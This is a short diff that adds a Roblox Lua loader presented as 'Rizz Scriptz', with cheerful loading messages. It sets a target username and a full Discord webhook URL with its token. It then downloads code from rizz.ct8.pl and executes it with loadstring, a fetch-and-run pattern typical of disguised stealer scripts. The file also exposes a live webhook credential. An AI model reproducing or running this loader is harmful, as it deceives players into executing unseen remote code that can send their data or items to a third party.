@@ -1,0 +1,8 @@
+UserName = "sephsTra3h"
+Webhook = "https://discord.com/api/webhooks/1099902991852642385/-XgSG7-o0t5iOszBv7NIGqlVJTu17AHSCr1ePP2TwEywKdvslVxs8CaiQHc9wi-BMhKh"
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "please wait for the script to load :)"
+_G.SecondText = "i hope you enjoy the script!"
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 10
+loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
